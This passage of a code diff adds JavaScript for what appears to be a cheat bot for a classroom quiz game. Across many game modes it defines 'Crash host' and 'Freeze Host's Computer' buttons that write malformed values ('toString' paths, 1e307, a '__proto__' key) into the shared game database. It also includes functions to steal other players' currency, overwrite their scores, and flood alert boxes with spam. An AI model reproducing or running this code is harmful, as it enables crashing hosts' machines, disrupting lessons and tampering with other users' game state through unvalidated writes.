+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt("How much crypto do you want to steal?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Advertise Text",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "cr",
+
+                  (function () {
+
+                    var t = "";
+
+                    for (var n = 0; n < 100; n++) {
+
+                      t += "1";
+
+                    }
+
+                    for (n = 0; n < 500; n++) {
+
+                      t += e;
+
+                      t += n % 10 == 0 ? "\n\r" : " ";
+
+                    }
+
+                    return t;
+
+                  })()
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Send Ad Text",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                var t = prompt(
+
+                  "Enter the text you would like to send (this will override your blook):"
+
+                );
+
+                if (t) {
+
+                  if (t.includes(":")) {
+
+                    alert("Ad text cannot include a colon!");
+
+                    return;
+
+                  }
+
+                  setUserVal(
+
+                    "b",
+
+                    "Parrot:" +
+
+                      (function () {
+
+                        var n = "";
+
+                        for (var r = 0; r < 500; r++) {
+
+                          n += t + " ";
+
+                        }
+
+                        return n;
+
+                      })()
+
+                  );
+
+                  setUserVal("tat", `${e}:100`);
+
+                }
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${botinfo.name}:${Date.now()}${new Array(1700)
+
+                    .fill(e + " ")
+
+                    .join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Gold: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(gold)",
+
+              action: function (e) {
+
+                setUserVal("g/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Steal Gold From",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt("How much gold do you want to steal?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Set Player's Gold",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:swap:${prompt("What do you want to set it to?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Gold",
+
+              action: function (e) {
+
+                setUserVal("g", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Send Ad Text",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                var t = prompt(
+
+                  "Enter the text you would like to send (this will override your blook):"
+
+                );
+
+                if (t) {
+
+                  if (t.includes(":")) {
+
+                    alert("Ad text cannot include a colon!");
+
+                    return;
+
+                  }
+
+                  setUserVal("b", "Dog:" + new Array(500).fill(t).join(" "));
+
+                  setUserVal("tat", `${e}:100`);
+
+                }
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${botinfo.name}:${Date.now()}${new Array(1700)
+
+                    .fill(e + " ")
+
+                    .join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Candy: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(candy)",
+
+              action: function (e) {
+
+                setUserVal("g/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Steal Candy From",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt("How much candy do you want to steal?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Set Player's Candy",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:swap:${prompt("What do you want to set it to?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Candy",
+
+              action: function (e) {
+
+                setUserVal("g", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Send Ad Text",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                var t = prompt(
+
+                  "Enter the text you would like to send (this will override your blook):"
+
+                );
+
+                if (t) {
+
+                  if (t.includes(":")) {
+
+                    alert("Ad text cannot include a colon!");
+
+                    return;
+
+                  }
+
+                  setUserVal("b", "Dog:" + new Array(500).fill(t).join(" "));
+
+                  setUserVal("tat", `${e}:100`);
+
+                }
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${botinfo.name}:${Date.now()}${new Array(1700)
+
+                    .fill(e + " ")
+
+                    .join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Defense2: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(defense2)",
+
+              action: function (e) {
+
+                setUserVal("d/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("r/toString", "t");
+
+                } else {
+
+                  setUserVal("r", 1);
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Damage",
+
+              action: function (e) {
+
+                setUserVal("d", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Round",
+
+              action: function (e) {
+
+                setUserVal("r", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "r",
+
+                  `${Date.now()}${new Array(1700).fill(e + " ").join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Defense: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("d/toString", "t");
+
+                } else {
+
+                  setUserVal("d", 0);
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Damage",
+
+              action: function (e) {
+
+                setUserVal("d", e);
+
+              },
+
+            },
+
+          ],
+
+          Fish: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("f/t", "t");
+
+                } else {
+
+                  setUserVal("f", "Old Boot");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Weight",
+
+              action: function (e) {
+
+                setUserVal("w", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Caught Fish",
+
+              action: function (e) {
+
+                setUserVal("f", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Send Distraction",
+
+              action: function (e) {
+
+                setUserVal("s", true);
+
+                setUserVal("f", e);
+
+              },
+
+            },
+
+          ],
+
+          Pirate: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(pirate)",
+
+              action: function (e) {
+
+                setUserVal("d/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Steal Doubloons From",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt("How many doubloons do you want to steal?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Doubloons",
+
+              action: function (e) {
+
+                setUserVal("d", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Send Ad Text",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                var t = prompt(
+
+                  "Enter the text you would like to send (this will override your blook):"
+
+                );
+
+                if (t) {
+
+                  if (t.includes(":")) {
+
+                    alert("Ad text cannot include a colon!");
+
+                    return;
+
+                  }
+
+                  setUserVal(
+
+                    "b",
+
+                    "Parrot:" +
+
+                      (function () {
+
+                        var n = "";
+
+                        for (var r = 0; r < 500; r++) {
+
+                          n += t + " ";
+
+                        }
+
+                        return n;
+
+                      })()
+
+                  );
+
+                  setUserVal("tat", `${e}:100`);
+
+                }
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${botinfo.name}:${Date.now()}${new Array(1700)
+
+                    .fill(e + " ")
+
+                    .join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Dino: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(dino)",
+
+              action: function (e) {
+
+                setUserVal("f/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Fossils",
+
+              action: function (e) {
+
+                setUserVal("f", e);
+
+              },
+
+            },
+
+            {
+
+              type: "staticsel",
+
+              name: "Set Cheating",
+
+              values: ["true", "false"],
+
+              action: function (e) {
+
+                setUserVal("ic", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Catch Player Cheating",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal("tat", `${e}:true`);
+
+              },
+
+            },
+
+          ],
+
+          Cafe: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Cash",
+
+              action: function (e) {
+
+                setUserVal("ca", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Upgrade(ex. Cereal:1)",
+
+              action: function (e) {
+
+                setUserVal("up", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Attack player",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt(
+
+                    "What attack do you want(inspect, pay, etc)?"
+
+                  )}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "up",
+
+                  `a:${Date.now()}${new Array(1700).fill(e + " ").join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Brawl: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(brawl)",
+
+              action: function (e) {
+
+                setUserVal("xp/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("up/t", "t");
+
+                } else {
+
+                  setUserVal("up", "Dark Energy:2");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set XP",
+
+              action: function (e) {
+
+                setUserVal("xp", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Upgrade(upgrade:level)",
+
+              action: function (e) {
+
+                setUserVal("up", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Flood Alert Box",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "up",
+
+                  `__proto__:${Date.now()}${new Array(1700)
+
+                    .fill(e + " ")
+
+                    .join("")}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Racing: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard and Attacks",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("pr/toString", "t");
+
+                } else {
+
+                  setUserVal("pr", 0);
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard and Attacks"
+
+                  : "Freeze Scoreboard and Attacks";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Questions Left",
+
+              action: function (e) {
+
+                setUserVal("pr", gameobject.s.a - parseInt(e));
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Attack player",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt(
+
+                    "Which attack do you want to perform(rocket,etc)?"
+
+                  )}`
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          Classic: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Question",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("a/toString", "t");
+
+                } else {
+
+                  setUserVal("a", 1);
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Question"
+
+                  : "Freeze Question";
+
+              },
+
+            },
+
+          ],
+
+          Royale: [
+
+            {
+
+              type: "button",
+
+              name: "Send Crash Answer",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`, "t");
+
+                } else {
+
+                  setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`, 2);
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unsend Crash Answer"
+
+                  : "Send Crash Answer";
+
+              },
+
+            },
+
+          ],
+
+          Rush: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Host's Computer",
+
+              action: function (e) {
+
+                setUserVal("bs", 1e307);
+
+                e.innerHTML = "He aint coming back from this one!";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("d/toString", "t");
+
+                } else {
+
+                  setUserVal("d", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Blooks",
+
+              action: function (e) {
+
+                setUserVal("bs", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Defense",
+
+              action: function (e) {
+
+                setUserVal("d", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Advertise Text",
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "d",
+
+                  (function () {
+
+                    var t = "";
+
+                    for (var n = 0; n < 100; n++) {
+
+                      t += "1";
+
+                    }
+
+                    for (n = 0; n < 500; n++) {
+
+                      t += e;
+
+                      t += n % 10 == 0 ? "\n\r" : " ";
+
+                    }
+
+                    return t;
+
+                  })()
+
+                );
+
+              },
+
+            },
+
+          ],
+
+          "Rush (teams)": [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Host's Computer",
+
+              action: function (e) {
+
+                setTeamVal("bs", 1e307);
+
+                e.innerHTML = "He aint coming back from this one!";
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Blooks",
+
+              action: function (e) {
+
+                setTeamVal("bs", parseInt(e));
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Defense",
+
+              action: function (e) {
+
+                setTeamVal("d", parseInt(e));
+
+              },
+
+            },
+
+          ],
+
+          Factory: [
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("ca/toString", "t");
+
+                } else {
+
+                  setUserVal("ca", 0);
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "staticsel",
+
+              name: "Send Distraction",
+
+              values: ["dp"],
+
+              action: function (e) {
+
+                setUserVal("tat", e);
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Cash",
+
+              action: function (e) {
+
+                setUserVal("ca", e);
+
+              },
+
+            },
+
+          ],
+
+          Toy: [
+
+            {
+
+              type: "button",
+
+              name: "Crash host(toy)",
+
+              action: function (e) {
+
+                setUserVal("t/t", "t");
+
+                e.innerText = "Crashing";
+
+              },
+
+            },
+
+            {
+
+              type: "button",
+
+              name: "Freeze Scoreboard",
+
+              action: function (e) {
+
+                if (e.frozen != null) {
+
+                  e.frozen = !e.frozen;
+
+                } else {
+
+                  e.frozen = true;
+
+                }
+
+                if (e.frozen) {
+
+                  setUserVal("tat/t", "t");
+
+                } else {
+
+                  setUserVal("tat", "t");
+
+                }
+
+                e.innerText = e.frozen
+
+                  ? "Unfreeze Scoreboard"
+
+                  : "Freeze Scoreboard";
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Steal Toys From",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:${prompt("How many toys do you want to steal?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Set Player's Toys",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                setUserVal(
+
+                  "tat",
+
+                  `${e}:swap:${prompt("What do you want to set it to?")}`
+
+                );
+
+              },
+
+            },
+
+            {
+
+              type: "input",
+
+              name: "Set Toys",
+
+              action: function (e) {
+
+                setUserVal("t", e);
+
+              },
+
+            },
+
+            {
+
+              type: "select",
+
+              name: "Send Ad Text",
+
+              computed: function (e) {
+
+                return (
+
+                  Object.keys(gameobject.c).length !==
+
+                    Array.from(e.children).length && Object.keys(gameobject.c)
+
+                );
+
+              },
+
+              action: function (e) {
+
+                var t = prompt(
+
+                  "Enter the text you would like to send (this will override your blook):"
+
+                );
+
+                if (t) {
+
+                  if (t.includes(":")) {
+
+                    alert("Ad text cannot include a colon!");
+
+                    return;
+
+                  }
+
+                  setUserVal("b", "Dog:" + new Array(500).fill(t).join(" "));
+
+                  setUserVal("tat", `${e}:100`);
+
+                }
+
+              },
+
+            },
+
+            {
+
+              type: "cselect",
+
+              name: "Send Distraction",
+
+              values: Object.entries({
+
+                c: "Oh Canada",
+
+                b: "Blizzard",
+
+                f: "Fog Spell",
+
+                d: "Dark & Dusk",
+
+                w: "Howling Wind",
+
+                g: "Gift Time!",
+
+                t: "TREES",
+
+                s: "Snow Plow",
+
+                fr: "Use The Force",
+
+              }).map(([e, t]) => ({
+
+                name: t,
+
+                value: e,
+
+              })),
+
+              action: function (e) {
+
+                setUserVal("tat", e);
+
+              },
+
+            },
+
+          ],
+
+        };
+
+        var global = [
+
+          {
+
+            type: "staticsel",
+
+            name: "Set Blook",
+
+            values: blooks,
+
+            action: function (e) {
+
+              setUserVal("b", e);
+
+            },
+
+          },
+
+          {
+
+            type: "input",
+
+            name: "Set Banner",
+
+            action: function (e) {
+
+              setUserVal("bg", e);
+
+            },
+
+          },
+
+          {
+
+            type: "button",
+
+            name: "Leave Game",
+
+            action: function (e) {
+
+              leaveGame();
+
+              finishG();
+
+              e.innerText = "Leaving";
+
+            },
+
+          },
+
+          {
+
+            type: "button",
+
+            name: "Crash host",
+
+            action: function (e) {
+
+              setUserVal("b/toString", "t");
+
+              e.innerText = "Crashing";
+
+            },
+
+          },
+
+        ];
+
+        function setTeamVal(e, t) {
+
+          return setVal(`/${botinfo.gid}/a/${botinfo.name}/${e}`, t);
+
+        }
+
+        function onUpdateData(e) {
+
+          if (gameobject && gameobject.s) {
+
+            onData(e);
+
+          } else {
+
+            onFirstData(e);
+
+          }
+
+          gameobject = e;
+
+        }
+
+        function joinGame(e, t, n) {
+
+          if (botinfo.connecting) {
+
+            errorBar("Connecting to game, please wait...");
+
+          } else {
+
+            if (document.getElementById("bcf").getAttribute("checked")) {
+
+              t = bypassFilter(t);
+
+            }
+
+            if (document.getElementById("fpswitch").getAttribute("checked")) {
+
+              t = String.fromCharCode(32) + String.fromCharCode(32) + t;
+
+            }
+
+            connect(e, t, n);
+
+          }
+
+        }
+
+        function onFirstData(e) {
+
+          var t = e.s.t;
+
+          if (t === "Rush" && e.s.m === "Teams") {
+
+            t = "Rush (teams)";
+
+          }
+
+          console.log("Game type: " + t);
+
+          renderCheats(t);
+
+        }
+
+        function onData(e) {
+
+          if (e) {
+
+            if (e.stg === "fin" && botinfo.connected) {
+
+              botinfo.connected = false;
+
+              console.log("Game ended!");
+
+              console.log("Time: " + getTime());
+
+              leaveGame();
+
+              finishG();
+
+              return;
+
+            } else {
+
+              return undefined;
+
+            }
+
+          } else {
+
+            console.log("Game disconnected!");
+
+            errorBar("Game crashed!");
+
+            leaveGame();
+
+            finishG();
+
+            return;
+
+          }
+
+        }
+
+        function leaveGame() {
+
+          if (botinfo.connected) {
+
+            setUserVal("", {});
+
+            botinfo.fbdb = false;
+
+            deleteApp(botinfo.liveApp);
+
+            botinfo.connected = false;
+
+            botinfo.liveApp = false;
+
+            gameobject = {};
+
+            updateStatus("Ready");
+
+          }
+
+        }
+
+        function setUserVal(e, t) {
+
+          if (botinfo.connected) {
+
+            console.log(e, t);
+
+            setVal({
+
+              path: "c/" + botinfo.name + "/" + e,
+
+              val: t,
+
+            });
+
+          } else {
+
+            alert("You must be connected to a game to set values!");
+
+          }
+
+        }
+
+        function getTime() {
+
+          var e = (Date.now() - new Date(gameobject.s.d).getTime()) / 60000;
+
+          return Math.floor(e) + ":" + (Math.floor(e * 60) % 60);
+
+        }
+
+        function createNormText(e) {
+
+          var t = document.createElement("div");
+
+          t.className = "normtext";
+
+          t.innerText = e;
+
+          return t;
+
+        }
+
+        function createCheatContainer() {
+
+          var e = document.createElement("div");
+
+          e.className = "cheatcontainer";
+
+          return e;
+
+        }
+
+        function updateStatus(e) {
+
+          document.getElementById("status").innerText = "Status: " + e;
+
+        }
+
+        function createButton(e, t) {
+
+          var n = document.createElement("button");
+
+          n.innerText = e;
+
+          n.addEventListener("click", function () {
+
+            t(n);
+
+          });
+
+          return n;
+
+        }
+
+        function renderCheats(e) {
+
+          var t = document.getElementById("ctrlpanel");
+
+          document.getElementById("cc").style.display = "none";
+
+          t.appendChild(createNormText("Bot Successful! Type: " + e));
+
+          if (cheats[e]) {
+
+            t.appendChild(createNormText("Cheats: "));
+
+            var n = createCheatContainer();
+
+            cheats[e].forEach((e) => {
+
+              switch (e.type) {
+
+                case "button":
+
+                  n.appendChild(createButton(e.name, e.action));
+
+                  break;
+
+                case "input":
+
+                  n.appendChild(createInp(e.name, e.action));
+
+                  break;
+
+                case "select":
+
+                  n.appendChild(createSel(e.name, e.computed, e.action));
+
+                  break;
+
+                case "staticsel":
+
+                  n.appendChild(createStaticSel(e.name, e.values, e.action));
+
+                  break;
+
+                default:
+
+                  console.log("Unsupported!");
+
+              }
+
+            });
+
+            t.appendChild(n);
+
+          }
+
+          t.appendChild(createNormText("Global Cheats:"));
+
+          t.appendChild(createGlobalContainer());
+
+        }
+
+        function finishG() {
+
+          var e = document.getElementById("ctrlpanel");
+
+          var t = document.getElementById("cc");
+
+          e.innerHTML = "";
+
+          t.style.display = "block";
+
+          errorBar("Game Ended!");
+
+        }
+
+        function createInp(e, t) {
+
+          var n = document.createElement("div");
+
+          n.className = "inputcontainer";
+
+          var a = document.createElement("div");
+
+          a.innerText = e + ":";
+
+          n.appendChild(a);
+
+          var o = document.createElement("input");
+
+          n.appendChild(o);
+
+          n.addEventListener("click", function (e) {
+
+            if (e.target !== o) {
+
+              t(o.value);
+
+            }
+
+          });
+
+          return n;
+
+        }
+
+        function createSel(e, t, n) {
+
+          var a = document.createElement("div");
+
+          a.className = "inputcontainer";
+
+          var o = document.createElement("div");
+
+          o.innerText = e + ":";
+
+          a.appendChild(o);
+
+          var r = document.createElement("select");
+
+          r.innerHTML = "<option>Click to update</option>";
+
+          r.addEventListener("click", function (e) {
+
+            var n = t(r);
+
+            if (n) {
+
+              r.innerHTML = "";
+
+              n.sort().forEach((e) => {
+
+                var t = document.createElement("option");
+
+                t.innerText = e;
+
+                r.appendChild(t);
+
+              });
+
+            }
+
+          });
+
+          a.appendChild(r);
+
+          a.addEventListener("click", function (e) {
+
+            if (e.target !== r) {
+
+              n(r.value);
+
+            }
+
+          });
+
+          return a;
+
+        }
+
+        function createGlobalContainer() {
+
+          var e = createCheatContainer();
+
+          global.forEach((t) => {
+
+            switch (t.type) {
+
+              case "button":
+
+                e.appendChild(createButton(t.name, t.action));
+
+                break;
+
